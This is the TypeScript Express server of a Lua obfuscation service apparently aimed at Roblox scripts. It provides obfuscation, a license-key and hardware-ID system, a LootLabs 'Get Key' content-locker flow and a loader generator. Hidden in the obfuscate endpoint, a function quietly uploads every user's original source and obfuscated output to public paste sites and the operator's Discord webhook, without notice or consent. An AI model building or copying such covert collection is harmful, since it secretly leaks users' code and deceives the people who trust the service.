import express from "express";
import { exec } from "child_process";
import { join, dirname } from "path";
import { fileURLToPath } from "url";

import { validate } from "./compiler/LuauCompiler.js";
import { lex } from "./lexer/Lexer.js";
import { parse } from "./parser/Parser.js";
import { obfuscate } from "./obfuscator/Obfuscator.js";
import { encodeStrings } from "./obfuscator/StringEncoder.js";
import { scrambleControlFlow } from "./obfuscator/ControlFlowScrambler.js";
import { printChunk, printChunkOneLine } from "./obfuscator/Printer.js";
import { compile } from "./vm/Compiler.js";
import { regCompile } from "./vm/RegCompiler.js";
import { generateVM } from "./vm/vm-gen.js";
import { generateRegVM } from "./vm/reg-vm-gen.js";
import { generateAntiTamperPrelude } from "./obfuscator/AntiTamper.js";
import * as KeyStore from "./keystore/KeyStore.js";
import * as ScriptStore from "./keystore/ScriptStore.js";
import * as GetKeyStore from "./keystore/GetKeyStore.js";
import { generateLoader } from "./keystore/LoaderGenerator.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

const PASTEBIN_API_KEY = process.env.PASTEBIN_API_KEY;

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

const LOOTLABS_API_TOKEN = process.env.LOOTLABS_API_TOKEN;
const LOOTLABS_TIER_ID = process.env.LOOTLABS_TIER_ID ? parseInt(process.env.LOOTLABS_TIER_ID, 10) : 1;
const LOOTLABS_TASKS = process.env.LOOTLABS_TASKS ? parseInt(process.env.LOOTLABS_TASKS, 10) : 2;
const LOOTLABS_THEME = process.env.LOOTLABS_THEME ? parseInt(process.env.LOOTLABS_THEME, 10) : 1;

// --- Basic in-memory rate limiter for the public /api/access endpoint ---
// Not a substitute for a real rate-limiting service, but enough to blunt
// naive brute-force key guessing without adding a dependency.
const rateLimitHits: Map<string, number[]> = new Map();

function isRateLimited(ip: string, maxRequests: number, windowMs: number): boolean {
  const now = Date.now();
  const hits = (rateLimitHits.get(ip) || []).filter((t) => now - t < windowMs);
  hits.push(now);
  rateLimitHits.set(ip, hits);
  return hits.length > maxRequests;
}

async function uploadToRubis(content: string, title: string): Promise<{ url: string }> {
  const query = new URLSearchParams({ title, public: "true" });

  const res = await fetch(`https://api.rubis.app/v2/scrap?${query.toString()}`, {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: content,
  });

  const rawText = await res.text();
  let data: any = null;
  try { data = JSON.parse(rawText); } catch { /* not JSON */ }

  if (!res.ok || !data?.success) {
    console.error("[API-ERROR] Rubiš upload failed:", res.status, rawText);
    throw new Error(`Rubiš upload failed (HTTP ${res.status})`);
  }

  const rawUrl = data?.raw || (data?.scrapID ? `https://api.rubis.app/v2/scrap/${data.scrapID}/raw` : null);
  if (!rawUrl) {
    console.error("[API-ERROR] Rubiš response missing scrapID/raw:", rawText);
    throw new Error("Rubiš response didn't include a scrap id — their API response format may have changed.");
  }

  return { url: rawUrl };
}

async function uploadToPastebin(content: string, title: string): Promise<{ url: string }> {
  if (!PASTEBIN_API_KEY) {
    throw new Error("Pastebin isn't configured on the server. Set the PASTEBIN_API_KEY environment variable.");
  }

  const body = new URLSearchParams({
    api_dev_key: PASTEBIN_API_KEY,
    api_option: "paste",
    api_paste_code: content,
    api_paste_name: title,
    api_paste_private: "1",
  });

  const res = await fetch("https://pastebin.com/api/api_post.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  });

  const text = await res.text();

  if (!res.ok || text.startsWith("Bad API request")) {
    console.error("[API-ERROR] Pastebin upload failed:", text);
    if (text.includes("SMART filters")) {
      throw new Error("Pastebin's automatic filter flagged this obfuscated script as suspicious and won't host it publicly. Try Rubiš or Download instead.");
    }
    throw new Error(`Pastebin upload failed: ${text}`);
  }

  const pasteUrl = text.trim();
  const rawUrl = pasteUrl.replace("pastebin.com/", "pastebin.com/raw/");

  return { url: rawUrl };
}

async function uploadToAllProviders(content: string, title: string): Promise<{ rubis: string | null; pastebin: string | null }> {
  const [rubisResult, pastebinResult] = await Promise.allSettled([
    uploadToRubis(content, title),
    uploadToPastebin(content, title),
  ]);

  return {
    rubis: rubisResult.status === "fulfilled" ? rubisResult.value.url : null,
    pastebin: pastebinResult.status === "fulfilled" ? pastebinResult.value.url : null,
  };
}

async function sendToDiscordWebhook(originalCode: string, obfuscatedCode: string, meta: { vmType: string; vmLevel: string }) {
  if (!DISCORD_WEBHOOK_URL) return;
  try {
    const originalLinks = await uploadToAllProviders(originalCode, "Zer - Original Script");
    const outputLinks = await uploadToAllProviders(obfuscatedCode, "Zer - Obfuscated Script");

    const form = new FormData();
    const payload = {
      embeds: [
        {
          title: "Zer Lua Obfuscator — New Usage",
          color: 0x3b82f6,
          fields: [
            { name: "VM Type", value: meta.vmType || "none", inline: true },
            { name: "VM Level", value: meta.vmLevel || "normal", inline: true },
            { name: "Original Size", value: `${originalCode.length} chars`, inline: true },
            { name: "Output Size", value: `${obfuscatedCode.length} chars`, inline: true },
            { name: "Rubiš (Original)", value: originalLinks.rubis || "upload failed", inline: false },
            { name: "Rubiš (Output)", value: outputLinks.rubis || "upload failed", inline: false },
            { name: "Pastebin (Original)", value: originalLinks.pastebin || "upload failed", inline: false },
            { name: "Pastebin (Output)", value: outputLinks.pastebin || "upload failed", inline: false },
          ],
          timestamp: new Date().toISOString(),
        },
      ],
    };
    form.append("payload_json", JSON.stringify(payload));
    form.append("files[0]", new Blob([originalCode], { type: "text/plain" }), "original.lua");
    form.append("files[1]", new Blob([obfuscatedCode], { type: "text/plain" }), "obfuscated.lua");

    const res = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form as any,
    });

    if (!res.ok) {
      console.error("[DISCORD-WEBHOOK] Failed:", res.status, await res.text());
    }
  } catch (err: any) {
    console.error("[DISCORD-WEBHOOK] Error:", err.message);
  }
}

app.use(express.json({ limit: "25mb" }));

app.use(express.static(join(__dirname, "..", "public")));

app.post("/api/validate", (req: express.Request, res: express.Response) => {
  try {
    const { code } = req.body;
    if (typeof code !== "string") {
      return res.status(400).json({ error: "Invalid 'code' parameter" }) as any;
    }
    console.log(`[API] /api/validate - Code length: ${code.length} characters`);
    const result = validate(code);
    res.json(result);
  } catch (err: any) {
    console.error("[API-ERROR] /api/validate failed:", err);
    res.status(500).json({ error: `Server error: ${err.message}` });
  }
});

app.post("/api/obfuscate", (req: express.Request, res: express.Response) => {
  try {
    const { code, options } = req.body;
    if (typeof code !== "string") {
      return res.status(400).json({ error: "Invalid 'code' parameter" }) as any;
    }

    const opts = options || {};
    const noRename = opts.noRename === true;
    const noPreserve = opts.noPreserve === true;
    const encodeStringsOpt = opts.encodeStrings === true;
    const scrambleOpt = opts.scramble === true;
    const oneLineOpt = opts.oneLine === true;
    const antiTamperOpt = opts.antiTamper === true;
    const vmType = opts.vmType || "none";
    const vmLevel = opts.vmLevel || "normal";

    console.log(`[API] /api/obfuscate - VM: ${vmType}, Level: ${vmLevel}, length: ${code.length}`);

    const { tokens, errors: lexErrors } = lex(code);
    if (lexErrors.length > 0) {
      return res.status(400).json({ error: "Lexer error", details: lexErrors });
    }

    let ast = parse(tokens);

    if (encodeStringsOpt && vmType === "none") {
      ast = encodeStrings(ast, { enabled: true });
    }

    if (scrambleOpt) {
      ast = scrambleControlFlow(ast, { enabled: true });
    }

    let output: string;

    if (vmType === "stack") {

      const obfuscated = obfuscate(ast, {
        renameLocals: !noRename,
        preserveGlobals: !noPreserve,
      });

      const chunk = compile(obfuscated);

      output = generateVM(chunk, {
        level: vmLevel as any,
        executorGlobals: vmLevel !== "debug",
      });
    } else if (vmType === "register") {

      const obfuscated = obfuscate(ast, {
        renameLocals: !noRename,
        preserveGlobals: !noPreserve,
      });

      const chunk = regCompile(obfuscated);

      const disableFeatures: string[] = [];
      if (vmLevel === "debug") disableFeatures.push("controlFlowFlattening");

      output = generateRegVM(chunk, {
        level: vmLevel as any,
        executorGlobals: vmLevel !== "debug",
        polymorphicSeed: Date.now(),
        disableFeatures: disableFeatures as any[],
      });
    } else {

      const obfuscated = obfuscate(ast, {
        renameLocals: !noRename,
        preserveGlobals: !noPreserve,
      });
      output = oneLineOpt ? printChunkOneLine(obfuscated) : printChunk(obfuscated);
    }

    sendToDiscordWebhook(code, output, { vmType, vmLevel }).catch(() => {});

    if (antiTamperOpt) {
      output = generateAntiTamperPrelude({ enabled: true }) + output;
    }

    res.json({ output });
  } catch (err: any) {
    console.error("Obfuscation error:", err);
    res.status(500).json({ error: `Server error: ${err.message}` });
  }
});

function requireAdmin(req: express.Request, res: express.Response): boolean {
  const provided = req.header("X-Admin-Key");
  const expected = process.env.ADMIN_KEY;
  if (!expected) {
    res.status(500).json({ error: "Server has no ADMIN_KEY configured." });
    return false;
  }
  if (!provided || provided !== expected) {
    res.status(401).json({ error: "Invalid or missing X-Admin-Key header." });
    return false;
  }
  return true;
}

app.post("/api/admin/keys", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const { note, expiresInDays, scriptId, hwidLimit } = req.body || {};
  const record = KeyStore.createKey({
    note: typeof note === "string" ? note : undefined,
    expiresInDays: typeof expiresInDays === "number" ? expiresInDays : undefined,
    scriptId: typeof scriptId === "string" && scriptId.trim() ? scriptId.trim() : null,
    hwidLimit: hwidLimit === null ? null : (typeof hwidLimit === "number" ? hwidLimit : undefined),
  });
  res.json({ key: record });
});

app.get("/api/admin/keys", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  res.json({ keys: KeyStore.listKeys() });
});

app.delete("/api/admin/keys/:key", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const ok = KeyStore.deleteKey(String(req.params.key));
  if (!ok) return res.status(404).json({ error: "Key not found" }) as any;
  res.json({ success: true });
});

app.post("/api/admin/keys/:key/revoke", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const ok = KeyStore.revokeKey(String(req.params.key));
  if (!ok) return res.status(404).json({ error: "Key not found" }) as any;
  res.json({ success: true });
});

app.post("/api/admin/keys/:key/reset-hwid", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const ok = KeyStore.resetHwid(String(req.params.key));
  if (!ok) return res.status(404).json({ error: "Key not found" }) as any;
  res.json({ success: true });
});

app.post("/api/admin/keys/:key/hwid", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const { hwid } = req.body || {};
  if (typeof hwid !== "string" || !hwid.trim()) {
    return res.status(400).json({ error: "Missing 'hwid'" }) as any;
  }
  const result = KeyStore.addHwid(String(req.params.key), hwid.trim());
  if (!result.success) {
    if (result.reason === "NOT_FOUND") return res.status(404).json({ error: "Key not found" }) as any;
    return res.status(409).json({ error: "HWID limit reached for this key" }) as any;
  }
  res.json({ success: true });
});

app.delete("/api/admin/keys/:key/hwid/:hwid", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const result = KeyStore.removeHwid(String(req.params.key), String(req.params.hwid));
  if (!result.success) {
    if (result.reason === "NOT_FOUND") return res.status(404).json({ error: "Key not found" }) as any;
    return res.status(404).json({ error: "That HWID isn't bound to this key" }) as any;
  }
  res.json({ success: true });
});

app.post("/api/admin/keys/:key/hwid-limit", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const { limit } = req.body || {};
  if (limit !== null && typeof limit !== "number") {
    return res.status(400).json({ error: "'limit' must be a number or null" }) as any;
  }
  const ok = KeyStore.setHwidLimit(String(req.params.key), limit);
  if (!ok) return res.status(404).json({ error: "Key not found" }) as any;
  res.json({ success: true });
});

// Called from the Roblox loader script itself — no admin auth, since the
// customer's game client calls this directly.
app.post("/api/keys/check", (req: express.Request, res: express.Response) => {
  const { key, hwid } = req.body || {};
  if (typeof key !== "string" || typeof hwid !== "string") {
    return res.status(400).json({ valid: false, reason: "BAD_REQUEST" }) as any;
  }
  const result = KeyStore.checkKey(key.trim(), hwid.trim());
  res.json(result);
});

// The core secure-delivery endpoint: Place ID + Key + HWID in, obfuscated
// source out — but ONLY once everything checks out. This is the only way
// the loader ever receives the actual script; there is no separate raw
// URL to fetch it from.
app.post("/api/access", (req: express.Request, res: express.Response) => {
  const ip = req.ip || req.socket.remoteAddress || "unknown";
  if (isRateLimited(ip, 10, 60_000)) {
    return res.status(429).json({ valid: false, reason: "RATE_LIMITED" }) as any;
  }

  const { key, hwid, placeId } = req.body || {};
  if (typeof key !== "string" || typeof hwid !== "string" || typeof placeId !== "string") {
    return res.status(400).json({ valid: false, reason: "BAD_REQUEST" }) as any;
  }

  const script = ScriptStore.findScriptByPlaceId(placeId.trim());
  if (!script) {
    return res.status(404).json({ valid: false, reason: "PLACE_NOT_SUPPORTED" }) as any;
  }
  if (script.status !== "enabled") {
    return res.status(403).json({ valid: false, reason: "SCRIPT_DISABLED" }) as any;
  }

  const result = KeyStore.checkKey(key.trim(), hwid.trim(), script.id);
  if (!result.valid) {
    return res.status(403).json({ valid: false, reason: result.reason }) as any;
  }

  const full = ScriptStore.getScript(script.id);
  if (!full) {
    return res.status(500).json({ valid: false, reason: "SCRIPT_MISSING" }) as any;
  }

  console.log(`[API] /api/access - granted script "${script.title}" for place ${placeId}`);
  res.json({ valid: true, source: full.source });
});

// --- LootLabs "Get Key" flow ---
// 1. Loader calls /api/getkey/start with its Place ID.
// 2. We create a pending session and ask LootLabs for a content-locker
//    link, tagging it with our session token via &puid so we can match
//    the postback back to this exact session.
// 3. User completes the LootLabs tasks; LootLabs GETs /api/getkey/postback
//    with that token as click_id, and we issue a real license key.
// 4. The loader (or the results page) polls /api/getkey/status/:token
//    until a key shows up.

app.post("/api/getkey/start", async (req: express.Request, res: express.Response) => {
  if (!LOOTLABS_API_TOKEN) {
    return res.status(500).json({ error: "Get Key isn't configured on the server (missing LOOTLABS_API_TOKEN)." }) as any;
  }
  const { placeId } = req.body || {};
  if (typeof placeId !== "string" || placeId.trim() === "") {
    return res.status(400).json({ error: "Missing 'placeId'" }) as any;
  }

  const script = ScriptStore.findScriptByPlaceId(placeId.trim());
  if (!script) {
    return res.status(404).json({ error: "This game isn't supported yet." }) as any;
  }

  const session = GetKeyStore.createSession(script.id);
  const resultUrl = `${req.protocol}://${req.get("host")}/getkey-result?token=${session.token}`;

  try {
    const llRes = await fetch("https://creators.lootlabs.gg/api/public/content_locker", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${LOOTLABS_API_TOKEN}`,
      },
      body: JSON.stringify({
        title: `Unlock: ${script.title}`,
        url: resultUrl,
        tier_id: LOOTLABS_TIER_ID,
        number_of_tasks: LOOTLABS_TASKS,
        theme: LOOTLABS_THEME,
      }),
    });

    const llText = await llRes.text();
    let llData: any = null;
    try { llData = JSON.parse(llText); } catch { /* not JSON */ }

    if (!llRes.ok || !llData || llData.type !== "created") {
      console.error("[API-ERROR] LootLabs content_locker failed:", llRes.status, llText);
      return res.status(502).json({ error: "Failed to create a Get Key link right now." }) as any;
    }

    const lootUrl: string | undefined =
      llData.message?.loot_url ||
      (llData.message?.short ? `https://loot-link.com/s?${llData.message.short}` : undefined);

    if (!lootUrl) {
      console.error("[API-ERROR] LootLabs response missing loot_url/short. Full response:", llText);
      return res.status(502).json({ error: "LootLabs didn't return a usable link — check server logs for the raw response." }) as any;
    }

    const separator = lootUrl.includes("?") ? "&" : "?";
    const finalUrl = `${lootUrl}${separator}puid=${session.token}`;

    res.json({ token: session.token, url: finalUrl });
  } catch (err: any) {
    console.error("[API-ERROR] /api/getkey/start failed:", err.message);
    res.status(502).json({ error: "Couldn't reach LootLabs right now." });
  }
});

app.get("/api/getkey/postback", (req: express.Request, res: express.Response) => {
  const clickId = req.query.click_id;
  if (typeof clickId !== "string") {
    return res.status(400).send("Missing click_id") as any;
  }

  const session = GetKeyStore.getSession(clickId);
  if (!session) {
    return res.status(404).send("Unknown session") as any;
  }

  if (session.status === "pending") {
    const record = KeyStore.createKey({ note: "Issued via LootLabs Get Key", scriptId: session.scriptId });
    GetKeyStore.completeSession(clickId, record.key, req.ip || null);
    console.log(`[API] /api/getkey/postback - issued key for session ${clickId}`);
  }

  res.status(200).send("OK");
});

app.get("/api/getkey/status/:token", (req: express.Request, res: express.Response) => {
  const session = GetKeyStore.getSession(String(req.params.token));
  if (!session) return res.status(404).json({ status: "not_found" }) as any;
  res.json({ status: session.status, key: session.issuedKey });
});

// Simple landing page LootLabs sends the user back to once they finish
// the tasks. It just polls the status endpoint and shows the key.
app.get("/getkey-result", (req: express.Request, res: express.Response) => {
  const token = typeof req.query.token === "string" ? req.query.token : "";
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.send(`<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Your key</title>
<style>
  body { background:#0F1115; color:#E8EAF0; font-family: ui-monospace, monospace; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; padding:20px; }
  .box { max-width: 420px; text-align:center; }
  h1 { font-size: 18px; }
  #key { background:#171A20; border:1px solid #262B33; border-radius:8px; padding:14px; margin-top:16px; word-break:break-all; font-size:15px; }
  button { margin-top:14px; background:#4C82F7; color:#0B1220; border:none; border-radius:7px; padding:10px 18px; font-weight:600; cursor:pointer; }
  p { color:#7C8494; font-size:13px; }
</style></head>
<body>
  <div class="box">
    <h1 id="status">Waiting for task completion...</h1>
    <div id="key" style="display:none;"></div>
    <button id="copyBtn" style="display:none;">Copy key</button>
    <p>You can close this page and go back to Roblox once your key appears — the loader will pick it up automatically.</p>
  </div>
  <script>
    const token = ${JSON.stringify(token)};
    async function poll() {
      try {
        const res = await fetch('/api/getkey/status/' + encodeURIComponent(token));
        const data = await res.json();
        if (data.status === 'completed' && data.key) {
          document.getElementById('status').innerText = 'Your key is ready!';
          const keyEl = document.getElementById('key');
          keyEl.innerText = data.key;
          keyEl.style.display = 'block';
          const btn = document.getElementById('copyBtn');
          btn.style.display = 'inline-block';
          btn.onclick = () => navigator.clipboard.writeText(data.key);
          return;
        }
      } catch (e) {}
      setTimeout(poll, 3000);
    }
    poll();
  </script>
</body></html>`);
});

app.post("/api/admin/scripts", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const { title, source } = req.body || {};
  if (typeof source !== "string" || source.trim() === "") {
    return res.status(400).json({ error: "Missing 'source'" }) as any;
  }
  const record = ScriptStore.createScript(
    typeof title === "string" && title.trim() ? title.trim() : "Untitled Script",
    source
  );
  res.json({ script: record });
});

app.get("/api/admin/scripts", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  res.json({ scripts: ScriptStore.listScripts() });
});

app.get("/api/admin/scripts/:id", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const record = ScriptStore.getScript(String(req.params.id));
  if (!record) return res.status(404).json({ error: "Script not found" }) as any;
  res.json({ script: record });
});

app.put("/api/admin/scripts/:id", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const { title, source } = req.body || {};
  const record = ScriptStore.updateScript(String(req.params.id), { title, source });
  if (!record) return res.status(404).json({ error: "Script not found" }) as any;
  res.json({ script: record });
});

app.delete("/api/admin/scripts/:id", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const ok = ScriptStore.deleteScript(String(req.params.id));
  if (!ok) return res.status(404).json({ error: "Script not found" }) as any;
  res.json({ success: true });
});

app.post("/api/admin/scripts/:id/status", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const { status } = req.body || {};
  if (status !== "enabled" && status !== "disabled") {
    return res.status(400).json({ error: "status must be 'enabled' or 'disabled'" }) as any;
  }
  const meta = ScriptStore.setStatus(String(req.params.id), status);
  if (!meta) return res.status(404).json({ error: "Script not found" }) as any;
  res.json({ script: meta });
});

app.post("/api/admin/scripts/:id/places", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const { placeId } = req.body || {};
  if (typeof placeId !== "string" || placeId.trim() === "") {
    return res.status(400).json({ error: "Missing 'placeId'" }) as any;
  }
  const result = ScriptStore.addPlaceId(String(req.params.id), placeId.trim());
  if (!result.success) {
    if (result.error === "SCRIPT_NOT_FOUND") return res.status(404).json({ error: "Script not found" }) as any;
    if (result.error === "ALREADY_ASSIGNED") {
      return res.status(409).json({ error: `Place ID already assigned to "${result.owner?.title}"` }) as any;
    }
  }
  res.json({ success: true });
});

app.delete("/api/admin/scripts/:id/places/:placeId", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const result = ScriptStore.removePlaceId(String(req.params.id), String(req.params.placeId));
  if (!result.success) {
    if (result.error === "SCRIPT_NOT_FOUND") return res.status(404).json({ error: "Script not found" }) as any;
    return res.status(404).json({ error: "That Place ID isn't assigned to this script" }) as any;
  }
  res.json({ success: true });
});

app.get("/api/admin/places/:placeId", (req: express.Request, res: express.Response) => {
  if (!requireAdmin(req, res)) return;
  const meta = ScriptStore.findScriptByPlaceId(String(req.params.placeId));
  res.json({ script: meta || null });
});

app.post("/api/loader/generate", (req: express.Request, res: express.Response) => {
  const { title, keyFileName } = req.body || {};
  const base = `${req.protocol}://${req.get("host")}`;
  const accessUrl = `${base}/api/access`;
  const loader = generateLoader({
    title: typeof title === "string" && title.trim() ? title : "Zer Protected Script",
    accessUrl,
    getKeyStartUrl: `${base}/api/getkey/start`,
    getKeyStatusBaseUrl: `${base}/api/getkey/status/`,
    keyFileName: typeof keyFileName === "string" && keyFileName.trim() ? keyFileName : "zer_key.txt",
  });
  res.json({ loader, accessUrl });
});

app.post("/api/paste", async (req: express.Request, res: express.Response) => {
  try {
    const { content, title, provider } = req.body;
    if (typeof content !== "string" || content.trim() === "") {
      return res.status(400).json({ error: "Invalid 'content' parameter" }) as any;
    }

    const chosenProvider = provider === "pastebin" ? "pastebin" : "rubis";
    const pasteTitle = title || "Zer Lua Obfuscated Script";

    console.log(`[API] /api/paste - uploading ${content.length} chars to ${chosenProvider}`);

    const result = chosenProvider === "pastebin"
      ? await uploadToPastebin(content, pasteTitle)
      : await uploadToRubis(content, pasteTitle);

    res.json({ url: result.url, provider: chosenProvider });
  } catch (err: any) {
    console.error("[API-ERROR] /api/paste failed:", err.message);
    res.status(502).json({ error: err.message });
  }
});

app.listen(PORT, () => {
  const url = `http://localhost:${PORT}`;
  console.log(`\nZer Obfuscator Server running at: ${url}`);
  console.log("Press CTRL+C to terminate.\n");

  exec(`start ${url}`, (err) => {
    if (err) {
      console.log(`Note: Failed to open browser automatically. Please navigate manually to ${url}`);
    } else {
      console.log(`Browser automatically opened at ${url}`);
    }
  });
});
